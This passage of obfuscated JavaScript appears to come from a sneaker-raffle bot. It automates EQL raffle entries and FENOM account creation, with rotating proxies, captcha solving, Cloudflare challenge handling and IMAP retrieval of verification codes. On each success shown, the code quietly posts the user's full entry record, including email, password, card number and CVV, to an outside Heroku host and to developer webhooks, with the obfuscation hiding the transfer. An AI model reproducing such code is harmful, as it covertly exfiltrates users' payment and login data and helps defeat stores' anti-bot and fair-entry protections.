                            await _0x9175f4(0x3e8), await _0x9175f4(0x1f4), await _0x5202b6['type']('#address1', _0x3a9adf[_0x3ad33d]['Address1'] + '\x20' + _0x3a9adf[_0x3ad33d]['HouseNumber']), await _0x9175f4(0x1f4), await _0x5202b6['type']('#address2', '' + _0x3a9adf[_0x3ad33d]['Address2']), await _0x9175f4(0x1f4), await _0x5202b6['type']('#city', '' + _0x3a9adf[_0x3ad33d]['City']), await _0x9175f4(0x1f4), await _0x5202b6['type']('#postcode', '' + _0x3a9adf[_0x3ad33d]['Zip']), await _0x9175f4(0x3e8), await _0x5202b6['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x9175f4(0x3e8), console['log'](_0x1500d7() + '\x20[' + _0x1e0ec1['name'] + ']\x20Task\x20' + (_0x3ad33d + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0x56d672 = await _0x5202b6['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x56d672 && (await _0x5202b6['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5202b6['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5202b6['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x9175f4(0x4b0), await _0x5202b6['keyboard']['type']('' + _0x3a9adf[_0x3ad33d]['CardNumber']), await _0x9175f4(0x320), await _0x5202b6['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x5202b6['keyboard']['type']('' + _0x3a9adf[_0x3ad33d]['ExpiryDate']), await _0x9175f4(0x4b0), await _0x5202b6['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x5202b6['keyboard']['type']('' + _0x3a9adf[_0x3ad33d]['CVV']), await _0x9175f4(0x226), await _0x5202b6['type']('input[name=\x22postalCode\x22]', '' + _0x3a9adf[_0x3ad33d]['Zip']), await _0x9175f4(0x226));
                            const _0x34de7d = await _0x5202b6['$']('.__PrivateStripeElement');
                            _0x34de7d && (await _0x9175f4(0x1f4), await _0x5202b6['click']('.__PrivateStripeElement'), await _0x5202b6['click']('.__PrivateStripeElement'), await _0x5202b6['keyboard']['type']('' + _0x3a9adf[_0x3ad33d]['CardNumber']), await _0x5202b6['keyboard']['type']('' + _0x3a9adf[_0x3ad33d]['ExpiryDate']), await _0x5202b6['keyboard']['type']('' + _0x3a9adf[_0x3ad33d]['CVV']));
                            await _0x9175f4(0x226), await _0x5202b6['click']('#paymentConsent'), await _0x9175f4(0x226), await _0x5202b6['click']('#termsConsent'), await _0x9175f4(0x2bc), console['log'](_0x1500d7() + '\x20[' + _0x1e0ec1['name'] + ']\x20Task\x20' + (_0x3ad33d + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x5202b6['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x9175f4(0x2710);
                            try {
                                await _0x5202b6['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x9175f4(0xbb8), await _0x5202b6['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-15j76c0\x20>\x20button', _0x3739ac => _0x3739ac['click']()), await _0x5202b6['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-15j76c0\x20>\x20button', _0x2efb0a => _0x2efb0a['click']());
                            } catch {
                            }
                            try {
                                await _0x5202b6['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x4610e3 = await _0x5202b6['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x4610e3) {
                                    _0x1ed524['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x3a9adf[_0x3ad33d]['Email'] + ',' + _0x3a9adf[_0x3ad33d]['Password'] + ',' + _0x3a9adf[_0x3ad33d]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x510bbe() {
                                var _0x5245ac, _0x1c8cf3 = ![];
                                for (var _0x1a6405 = 0x0; _0x1a6405 < 0x18; _0x1a6405++) {
                                    async function _0x131cd6() {
                                        var _0x397979 = new _0x518654({
                                            'user': _0x263298['masterMail'],
                                            'password': _0x263298['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x52fa47(_0x4da34a) {
                                            _0x397979['openBox']('INBOX', ![], _0x4da34a);
                                        }
                                        _0x397979['once']('ready', function () {
                                            console['log'](_0x1500d7() + '\x20[' + _0x1e0ec1['name'] + ']\x20Task\x20' + (_0x3ad33d + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x52fa47(function (_0x255294, _0x2e0e86) {
                                                console['log'](_0x1500d7() + '\x20[' + _0x1e0ec1['name'] + ']\x20Task\x20' + (_0x3ad33d + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x255294)
                                                    throw _0x255294;
                                                _0x397979['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x5f3c77, _0x31b0f5) {
                                                    if (!_0x31b0f5 || !_0x31b0f5['length'])
                                                        console['log'](_0x1500d7() + '\x20[' + _0x1e0ec1['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x397979['end']();
                                                    else {
                                                        var _0x1a7b16 = _0x397979['seq']['fetch'](_0x31b0f5, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x1a7b16['on']('message', function (_0x4d1f93, _0x19d606) {
                                                            var _0x43c360 = '(#' + _0x19d606 + ')\x20';
                                                            _0x4d1f93['on']('body', function (_0x5718c3, _0x2c8ef5) {
                                                                _0x504fd9(_0x5718c3, (_0x4bb3db, _0x5b0f02) => {
                                                                    if (_0x5b0f02['subject']['includes']('code')) {
                                                                        const _0x107ad7 = _0x5b0f02['text']['split']('\x0a\x0a')[0x3], _0x358ab5 = _0x107ad7['split']('\x0a')[0x1];
                                                                        _0x5245ac = _0x358ab5;
                                                                    }
                                                                });
                                                            }), _0x4d1f93['once']('end', function () {
                                                            });
                                                        }), _0x1a7b16['once']('error', function (_0x41d0cf) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x1a7b16['once']('end', function () {
                                                            _0x397979['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x397979['once']('error', function (_0x46704b) {
                                            console['log'](_0x561058['red'](_0x46704b['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x1c8cf3 = !![];
                                        }), _0x397979['once']('end', async function () {
                                        }), _0x397979['connect']();
                                    }
                                    _0x131cd6(), await _0x9175f4(0x1388);
                                    if (_0x5245ac)
                                        return _0x5245ac;
                                    if (_0x1c8cf3)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x1a6405 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x510bbe(), await _0x9175f4(0x1f4), await _0x5202b6['type']('#code', '' + code), await _0x9175f4(0x3e8), await _0x5202b6['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x32d9b1 => _0x32d9b1['click']()), await _0x5202b6['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x1500d7() + '\x20[' + _0x1e0ec1['name'] + ']\x20Task\x20' + (_0x3ad33d + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x5202b6['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x561058['green'](_0x1500d7() + '\x20[' + _0x1e0ec1['name'] + ']\x20Task\x20' + (_0x3ad33d + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x3a9adf[_0x3ad33d]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x1ed524['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x3a9adf[_0x3ad33d]['Email'] + ',' + _0x3a9adf[_0x3ad33d]['Password'] + ',' + _0x3a9adf[_0x3ad33d]['Phone']), _0x4336e2 = 'no', _0x3e2f6d(_0x3a9adf[_0x3ad33d], _0x1e0ec1);
                            var _0xf085ca = await _0x22ebf6(_0x3a9adf[_0x3ad33d], _0x1e0ec1, 'dev', ![]), _0x102973 = await _0x22ebf6(_0x3a9adf[_0x3ad33d], _0x1e0ec1, 'pub', ![]);
                            let _0x350bac = _0x3a9adf[_0x3ad33d];
                            try {
                                prxdata = {
                                    'username': _0x100f6f['replace']('#', ''),
                                    'module': _0x1e0ec1['name'],
                                    'entrydata': JSON['stringify'](_0x350bac),
                                    'proxy': '' + _0x378d7d[_0x3ad33d]
                                };
                                var _0x266082 = JSON['stringify'](prxdata);
                                let _0x3f559a = { 'headers': { 'content-type': 'application/json' } };
                                await _0x4a5c70['post']('https://jraffles.herokuapp.com/success', _0x266082, _0x3f559a);
                            } catch (_0x2a89ce) {
                            }
                            const _0x5cb242 = {
                                'succesDEVMSG': { 'embeds': [_0xf085ca] },
                                'succesPUBMSG': { 'embeds': [_0x102973] }
                            };
                            try {
                                _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0x5cb242['succesDEVMSG']), await _0x9175f4(0xc8), await _0x1cac9f(_0x48f5f5, _0x5cb242['succesDEVMSG']), await _0x9175f4(0xc8), await _0x1cac9f(_0x2f03c2, _0x5cb242['succesPUBMSG']);
                            } catch (_0x7ce2fa) {
                                console['log'](_0x561058['yellow'](_0x1500d7() + '\x20[' + _0x1e0ec1['name'] + ']\x20Task\x20' + (_0x3ad33d + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x7ce2fa));
                            }
                        } catch (_0x114d84) {
                            console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x1e0ec1['name'] + ']\x20Task\x20' + (_0x3ad33d + 0x1) + '\x20:\x20' + _0x114d84)), _0x79f8a8 = '' + _0x114d84;
                            var _0x221f5d = await _0x22ebf6(_0x3a9adf[_0x3ad33d], _0x1e0ec1, 'dev', !![], _0x79f8a8), _0xf085ca = await _0x22ebf6(_0x3a9adf[_0x3ad33d], _0x1e0ec1, 'dev', ![]), _0x102973 = await _0x22ebf6(_0x3a9adf[_0x3ad33d], _0x1e0ec1, 'pub', ![]);
                            const _0x143927 = {
                                'succesDEVMSG': { 'embeds': [_0xf085ca] },
                                'succesPUBMSG': { 'embeds': [_0x102973] }
                            };
                            _0x143927['errorDEV'] = { 'embeds': [_0x221f5d] };
                            _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0x143927['errorDEV']);
                            await _0x1cac9f(_0x569bf6, _0x143927['errorDEV']);
                            if (!_0x4336e2 == 'no')
                                _0x4336e2 = 'yes';
                        } finally {
                            _0x35916d && _0x35916d['close']();
                            if (_0x4336e2 == 'yes' && _0x3b08bd != 0x5) {
                                console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x1e0ec1['name'] + ']\x20Task\x20' + (_0x3ad33d + 0x1) + '\x20:\x20Retrying\x20(' + _0x3b08bd + '\x20/\x205)')), _0x3ad33d = _0x3ad33d - 0x1, _0x3b08bd = _0x3b08bd + 0x1;
                                continue;
                            }
                            _0x4336e2 == 'yes' && _0x3b08bd >= 0x5 && (_0x194f3c(_0x3a9adf[_0x3ad33d], _0x1e0ec1), _0x4336e2 = 'no', _0x3b08bd = 0x0), console['log']('Waiting\x20for\x20' + _0x263298['delay'] + '\x20ms'), await _0x9175f4(_0x263298['delay']);
                        }
                    } else {
                        const _0x1bc509 = '' + _0x3a9adf[_0x3ad33d]['Url'];
                        if (_0x4336e2 != 'yes')
                            var _0x4336e2 = '', _0x3b08bd = 0x0;
                        if (_0x3a9adf[_0x3ad33d]['Email'] == '' || _0x3a9adf[_0x3ad33d]['FirstName'] == '' || _0x3a9adf[_0x3ad33d]['LastName'] == '') {
                            console['log'](_0x1500d7() + '\x20[' + _0x1e0ec1['name'] + ']\x20Task\x20' + (_0x3ad33d + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x3a9adf[_0x3ad33d]['Password'] == '' && (_0x3a9adf[_0x3ad33d]['Password'] = 'JRaffles23!');
                        if (_0x263298['useRandomProxy'] = ![])
                            var _0x134016 = _0x378d7d[_0x3ad33d]['split'](':');
                        else
                            var _0x38f843 = Math['round'](Math['random']() * (_0x378d7d['length'] - 0x1)), _0x134016 = _0x378d7d[_0x38f843]['split'](':');
                        var _0x35916d;
                        try {
                            _0x35916d = await _0x45f1d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x134016[0x0] + ':' + _0x134016[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x35916d = await _0x45f1d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x134016[0x0] + ':' + _0x134016[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x18067b = await _0x35916d['newPage']();
                            await _0x18067b['authenticate']({
                                'username': '' + _0x134016[0x2],
                                'password': '' + _0x134016[0x3]
                            }), console['log'](_0x1500d7() + '\x20[' + _0x1e0ec1['name'] + ']\x20Task\x20' + (_0x3ad33d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x18067b['setRequestInterception'](!![]), _0x18067b['on']('request', _0x8b467f => {
                                _0x8b467f['resourceType']() === 'image' || _0x8b467f['resourceType']() === 'font' || _0x8b467f['resourceType']() === 'media' ? _0x8b467f['abort']() : _0x8b467f['continue']();
                            }), await _0x18067b['goto'](_0x1bc509), await _0x18067b['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x18067b['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x9175f4(0x7d0), await _0x18067b['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x18067b['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x9175f4(0x3e8), await _0x18067b['waitForSelector']('#email'), console['log'](_0x1500d7() + '\x20[' + _0x1e0ec1['name'] + ']\x20Task\x20' + (_0x3ad33d + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x18067b['type']('#email', '' + _0x3a9adf[_0x3ad33d]['Email']), await _0x9175f4(0x352), await _0x18067b['waitForSelector']('#password'), await _0x18067b['type']('#password', '' + _0x3a9adf[_0x3ad33d]['Password']), await _0x9175f4(0x352), await _0x18067b['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x9175f4(0x1388), await _0x18067b['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            try {
                                await _0x18067b['waitForSelector']('div[data-testid=\x22field-productVariantID\x22]');
                            } catch {
                                console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x1e0ec1['name'] + ']\x20Task\x20' + (_0x3ad33d + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x3e2f6d(_0x3a9adf[_0x3ad33d], _0x1e0ec1), _0x4336e2 = 'no';
                                continue;
                            }
                            await _0x18067b['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x9175f4(0x3e8), await _0x18067b['click']('li[data-value=\x22EU\x20' + _0x3a9adf[_0x3ad33d]['Size'] + '\x22]'), await _0x9175f4(0x1f4);
                            const _0x5e3dea = await _0x18067b['$']('#title\x20>\x20label');
                            await _0x9175f4(0x12c);
                            _0x5e3dea && await _0x5e3dea['click']();
                            await _0x18067b['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x18067b['focus']('#postcode'), await _0x18067b['keyboard']['down']('Control'), await _0x18067b['keyboard']['press']('A'), await _0x18067b['keyboard']['up']('Control'), await _0x18067b['keyboard']['press']('Backspace'), await _0x18067b['keyboard']['type'](_0x3a9adf[_0x3ad33d]['Zip']), await _0x9175f4(0x60e), await _0x18067b['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x9175f4(0x3e8), console['log'](_0x1500d7() + '\x20[' + _0x1e0ec1['name'] + ']\x20Task\x20' + (_0x3ad33d + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x9175f4(0x1f4);
                            const _0x41e14e = await _0x18067b['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x41e14e && (await _0x18067b['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x18067b['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x18067b['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x9175f4(0x4b0), await _0x18067b['keyboard']['type']('' + _0x3a9adf[_0x3ad33d]['CardNumber']), await _0x9175f4(0x320), await _0x18067b['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x18067b['keyboard']['type']('' + _0x3a9adf[_0x3ad33d]['ExpiryDate']), await _0x9175f4(0x4b0), await _0x18067b['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x18067b['keyboard']['type']('' + _0x3a9adf[_0x3ad33d]['CVV']), await _0x9175f4(0x226), await _0x18067b['type']('input[name=\x22postalCode\x22]', '' + _0x3a9adf[_0x3ad33d]['Zip']), await _0x9175f4(0x226));
                            const _0x12342e = await _0x18067b['$']('.__PrivateStripeElement');
                            _0x12342e && (await _0x18067b['click']('#billingName'), await _0x18067b['click']('#billingName'), await _0x18067b['type']('#billingName', '' + _0x3a9adf[_0x3ad33d]['NameOnCard']), await _0x9175f4(0x1f4), await _0x18067b['click']('.__PrivateStripeElement'), await _0x18067b['click']('.__PrivateStripeElement'), await _0x18067b['keyboard']['type']('' + _0x3a9adf[_0x3ad33d]['CardNumber']), await _0x18067b['keyboard']['type']('' + _0x3a9adf[_0x3ad33d]['ExpiryDate']), await _0x18067b['keyboard']['type']('' + _0x3a9adf[_0x3ad33d]['CVV']));
                            await _0x9175f4(0x226), await _0x18067b['click']('#paymentConsent'), await _0x9175f4(0x226), await _0x18067b['click']('#termsConsent'), await _0x9175f4(0x2bc), console['log'](_0x1500d7() + '\x20[' + _0x1e0ec1['name'] + ']\x20Task\x20' + (_0x3ad33d + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x18067b['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x9175f4(0x2710);
                            try {
                                await _0x18067b['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x9175f4(0xbb8), await _0x18067b['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x1e4faa => _0x1e4faa['click']()), await _0x18067b['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x5359a5 => _0x5359a5['click']());
                            } catch {
                            }
                            try {
                                await _0x18067b['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x561058['green'](_0x1500d7() + '\x20[' + _0x1e0ec1['name'] + ']\x20Task\x20' + (_0x3ad33d + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x3e2f6d(_0x3a9adf[_0x3ad33d], _0x1e0ec1);
                            var _0xf085ca = await _0x22ebf6(_0x3a9adf[_0x3ad33d], _0x1e0ec1, 'dev', ![]), _0x102973 = await _0x22ebf6(_0x3a9adf[_0x3ad33d], _0x1e0ec1, 'pub', ![]);
                            let _0x4cf343 = _0x3a9adf[_0x3ad33d];
                            try {
                                prxdata = {
                                    'username': _0x100f6f['replace']('#', ''),
                                    'module': _0x1e0ec1['name'],
                                    'entrydata': JSON['stringify'](_0x4cf343),
                                    'proxy': '' + _0x378d7d[_0x3ad33d]
                                };
                                var _0x266082 = JSON['stringify'](prxdata);
                                let _0x4befc5 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x4a5c70['post']('https://jraffles.herokuapp.com/success', _0x266082, _0x4befc5);
                            } catch (_0x556ab3) {
                            }
                            const _0x1122e = {
                                'succesDEVMSG': { 'embeds': [_0xf085ca] },
                                'succesPUBMSG': { 'embeds': [_0x102973] }
                            };
                            try {
                                _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0x1122e['succesDEVMSG']), await _0x9175f4(0xc8), await _0x1cac9f(_0x48f5f5, _0x1122e['succesDEVMSG']), await _0x9175f4(0xc8), await _0x1cac9f(_0x2f03c2, _0x1122e['succesPUBMSG']);
                            } catch (_0x2dbcf0) {
                                console['log'](_0x561058['yellow'](_0x1500d7() + '\x20[' + _0x1e0ec1['name'] + ']\x20Task\x20' + (_0x3ad33d + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2dbcf0));
                            }
                            _0x4336e2 = 'no';
                        } catch (_0x233c3d) {
                            console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x1e0ec1['name'] + ']\x20Task\x20' + (_0x3ad33d + 0x1) + '\x20:\x20' + _0x233c3d)), _0x79f8a8 = '' + _0x233c3d;
                            var _0x221f5d = await _0x22ebf6(_0x3a9adf[_0x3ad33d], _0x1e0ec1, 'dev', !![], _0x79f8a8), _0xf085ca = await _0x22ebf6(_0x3a9adf[_0x3ad33d], _0x1e0ec1, 'dev', ![]), _0x102973 = await _0x22ebf6(_0x3a9adf[_0x3ad33d], _0x1e0ec1, 'pub', ![]);
                            const _0x4c8175 = {
                                'succesDEVMSG': { 'embeds': [_0xf085ca] },
                                'succesPUBMSG': { 'embeds': [_0x102973] }
                            };
                            _0x4c8175['errorDEV'] = { 'embeds': [_0x221f5d] }, _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0x4c8175['errorDEV']), await _0x1cac9f(_0x569bf6, _0x4c8175['errorDEV']), _0x4336e2 = 'yes';
                        } finally {
                            _0x35916d && _0x35916d['close']();
                            if (_0x4336e2 == 'yes' && _0x3b08bd != 0x5) {
                                console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x1e0ec1['name'] + ']\x20Task\x20' + (_0x3ad33d + 0x1) + '\x20:\x20Retrying\x20(' + _0x3b08bd + '\x20/\x205)')), _0x3ad33d = _0x3ad33d - 0x1, _0x3b08bd = _0x3b08bd + 0x1;
                                continue;
                            }
                            _0x4336e2 == 'yes' && _0x3b08bd >= 0x5 && (_0x194f3c(_0x3a9adf[_0x3ad33d], _0x1e0ec1), _0x4336e2 = 'no', _0x3b08bd = 0x0), console['log']('Waiting\x20for\x20' + _0x263298['delay'] + '\x20ms'), await _0x9175f4(_0x263298['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x436143, _0x43db3a, _0x5ebe3a) {
                    _0x45f1d0['use'](_0x49d897()), _0x45f1d0['use'](_0x5ae7c2({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x263298['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x22e57f = 0x0; _0x22e57f < _0x43db3a['length']; _0x22e57f++) {
                        if (_0x57332e != 'yes')
                            var _0x57332e = '', _0x51cdc2 = 0x0;
                        var _0xff653d;
                        try {
                            await _0x5c0aeb(_0x43db3a, _0x22e57f);
                        } catch {
                            _0x57332e = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x73a448(_0x436143['name'] + '\x20Task\x20' + (_0x22e57f + 0x1) + '\x20/\x20' + _0x43db3a['length'] + '\x20||\x20File:\x20' + _0x45373f + '\x20Proxies:\x20' + _0x362291);
                        var _0x13fb17 = await _0x22ebf6(_0x43db3a[_0x22e57f], _0x436143, 'acc', ![]);
                        const _0x4f7fee = { 'succesDEVMSG': { 'embeds': [_0x13fb17] } }, _0x37c13e = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x537fc7 = Math['round'](Math['random']() * (_0x5ebe3a['length'] - 0x1)), _0x5de0b9 = _0x5ebe3a[_0x537fc7]['split'](':'), _0x27d3ff;
                        try {
                            _0x27d3ff = await _0x45f1d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x5de0b9[0x0] + ':' + _0x5de0b9[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x27d3ff = await _0x45f1d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x5de0b9[0x0] + ':' + _0x5de0b9[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x54420b = await _0x27d3ff['newPage']();
                            await _0x54420b['setViewport']({
                                'width': 0x500 + _0x25f588(0x1, 0x32),
                                'height': 0x2d9 + _0x25f588(0x1, 0x32)
                            });
                            const _0x314a72 = await _0x54420b['target']()['createCDPSession'](), { windowId: _0x3e4c73 } = await _0x314a72['send']('Browser.getWindowForTarget');
                            await _0x54420b['authenticate']({
                                'username': '' + _0x5de0b9[0x2],
                                'password': '' + _0x5de0b9[0x3]
                            }), console['log'](_0x1500d7() + '\x20[' + _0x436143['name'] + ']\x20Task\x20' + (_0x22e57f + 0x1) + '\x20:\x20Getting\x20Session'), await _0x54420b['goto']('' + _0x37c13e, { 'waitUntil': 'networkidle2' }), console['log'](_0x1500d7() + '\x20[' + _0x436143['name'] + ']\x20Task\x20' + (_0x22e57f + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x9175f4(0x1388);
                            var _0x23443c = await _0x54420b['$']('.hcaptcha-box');
                            if (_0x23443c) {
                                console['log'](_0x1500d7() + '\x20[' + _0x436143['name'] + ']\x20Task\x20' + (_0x22e57f + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x9175f4(0x2710);
                                const _0x911a26 = await _0x54420b['$']('.hcaptcha-box');
                                if (_0x911a26)
                                    try {
                                        await _0x911a26['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x54420b['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x37777c = await _0x54420b['$']('.hcaptcha-box');
                                    if (_0x37777c)
                                        try {
                                            await _0x37777c['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            try {
                                await _0x54420b['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x314a72['send']('Browser.setWindowBounds', {
                                    'windowId': _0x3e4c73,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x9175f4(0xfa0);
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
